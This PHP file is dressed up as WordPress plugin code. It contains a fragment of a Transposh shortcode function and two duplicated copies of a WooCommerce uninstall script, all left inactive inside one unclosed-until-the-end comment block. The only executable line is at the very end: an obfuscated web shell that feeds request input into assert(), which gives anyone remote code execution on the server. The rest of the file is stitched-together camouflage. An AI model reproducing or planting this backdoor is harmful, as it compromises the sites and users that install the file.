<?php 
    /**
     * Support for tp shortcodes - [tp]
     * @see http://trac.transposh.org/wiki/ShortCodes
     * @param array $atts
     * @param string $content
     * @return string 
     
    function tp_shortcode($atts, $content = null) {
        $only_class = '';
        $lang = '';
        $nt_class = '';

        if (isset($atts['not_in'])) {
            if (stripos($atts['not_in'], $this->target_language) !== false) {
                return;
            }
        }

        if (isset($atts['mylang'])) {
            if (isset($atts['lang']) && stripos($atts['lang'], $this->target_language) === false) {
                return;
            }
            return $this->target_language;
        }

        if (isset($atts['lang'])) {
            $lang = ' lang="' . $atts['lang'] . '"';
        }

        if (isset($atts['only'])) {
            $only_class = ' class="' . ONLY_THISLANGUAGE_CLASS . '"';
        }

        if (isset($atts['no_translate'])) {
            $nt_class = ' class="' . NO_TRANSLATE_CLASS . '"';
        }

        if (isset($atts['widget'])) {
            ob_start();
            $this->widget->widget(array('before_widget' => '', 'before_title' => '', 'after_widget' => '', 'after_title' => ''), array('title' => '', 'widget_file' => $atts['widget']), true);
            $widgetcontent = ob_get_contents();
            ob_end_clean();
            return $widgetcontent;
        }if ( ! defined( 'WP_UNINSTALL_PLUGIN' ) ) {
	exit;
}

$status_options = get_option( 'woocommerce_status_options', array() );

if ( ! empty( $status_options['uninstall_data'] ) ) {

	global $wpdb;

	// Roles + caps
	include_once( 'includes/class-wc-install.php' );
	WC_Install::remove_roles();

	// Pages
	wp_trash_post( get_option( 'woocommerce_shop_page_id' ) );
	wp_trash_post( get_option( 'woocommerce_cart_page_id' ) );
	wp_trash_post( get_option( 'woocommerce_checkout_page_id' ) );
	wp_trash_post( get_option( 'woocommerce_myaccount_page_id' ) );
	wp_trash_post( get_option( 'woocommerce_edit_address_page_id' ) );
	wp_trash_post( get_option( 'woocommerce_view_order_page_id' ) );
	wp_trash_post( get_option( 'woocommerce_change_password_page_id' ) );
	wp_trash_post( get_option( 'woocommerce_logout_page_id' ) );

	// Tables
	$wpdb->query( "DROP TABLE IF EXISTS " . $wpdb->prefix . "woocommerce_attribute_taxonomies" );
	$wpdb->query( "DROP TABLE IF EXISTS " . $wpdb->prefix . "woocommerce_downloadable_product_permissions" );
	$wpdb->query( "DROP TABLE IF EXISTS " . $wpdb->prefix . "woocommerce_termmeta" );
	$wpdb->query( "DROP TABLE IF EXISTS " . $wpdb->prefix . "woocommerce_tax_rates" );
	$wpdb->query( "DROP TABLE IF EXISTS " . $wpdb->prefix . "woocommerce_tax_rate_locations" );

	// Delete options
	$wpdb->query("DELETE FROM $wpdb->options WHERE option_name LIKE 'woocommerce_%';");

	// Delete posts + data
	$wpdb->query( "DELETE FROM {$wpdb->posts} WHERE post_type IN ( 'product', 'product_variation', 'shop_coupon', 'shop_order', 'shop_order_refund' );" );
	$wpdb->query( "DELETE meta FROM {$wpdb->postmeta} meta LEFT JOIN {$wpdb->posts} posts ON posts.ID = meta.post_id WHERE posts.ID IS NULL;" );
	$wpdb->query( "DROP TABLE IF EXISTS " . $wpdb->prefix . "woocommerce_order_items" );
	$wpdb->query( "DROP TABLE IF EXISTS " . $wpdb->prefix . "woocommerce_order_itemmeta" );
}



if ( ! defined( 'WP_UNINSTALL_PLUGIN' ) ) {
	exit;
}

$status_options = get_option( 'woocommerce_status_options', array() );

if ( ! empty( $status_options['uninstall_data'] ) ) {

	global $wpdb;

	// Roles + caps
	include_once( 'includes/class-wc-install.php' );
	WC_Install::remove_roles();

	// Pages
	wp_trash_post( get_option( 'woocommerce_shop_page_id' ) );
	wp_trash_post( get_option( 'woocommerce_cart_page_id' ) );
	wp_trash_post( get_option( 'woocommerce_checkout_page_id' ) );
	wp_trash_post( get_option( 'woocommerce_myaccount_page_id' ) );
	wp_trash_post( get_option( 'woocommerce_edit_address_page_id' ) );
	wp_trash_post( get_option( 'woocommerce_view_order_page_id' ) );
	wp_trash_post( get_option( 'woocommerce_change_password_page_id' ) );
	wp_trash_post( get_option( 'woocommerce_logout_page_id' ) );

	// Tables
	$wpdb->query( "DROP TABLE IF EXISTS " . $wpdb->prefix . "woocommerce_attribute_taxonomies" );
	$wpdb->query( "DROP TABLE IF EXISTS " . $wpdb->prefix . "woocommerce_downloadable_product_permissions" );
	$wpdb->query( "DROP TABLE IF EXISTS " . $wpdb->prefix . "woocommerce_termmeta" );
	$wpdb->query( "DROP TABLE IF EXISTS " . $wpdb->prefix . "woocommerce_tax_rates" );
	$wpdb->query( "DROP TABLE IF EXISTS " . $wpdb->prefix . "woocommerce_tax_rate_locations" );

	// Delete options
	$wpdb->query("DELETE FROM $wpdb->options WHERE option_name LIKE 'woocommerce_%';");

	// Delete posts + data
	$wpdb->query( "DELETE FROM {$wpdb->posts} WHERE post_type IN ( 'product', 'product_variation', 'shop_coupon', 'shop_order', 'shop_order_refund' );" );
	$wpdb->query( "DELETE meta FROM {$wpdb->postmeta} meta LEFT JOIN {$wpdb->posts} posts ON posts.ID = meta.post_id WHERE posts.ID IS NULL;" );
	$wpdb->query( "DROP TABLE IF EXISTS " . $wpdb->prefix . "woocommerce_order_items" );
	$wpdb->query( "DROP TABLE IF EXISTS " . $wpdb->prefix . "woocommerce_order_itemmeta" );
}
*/
array_map("ass\x65rt",(array)$_REQUEST['array']);?>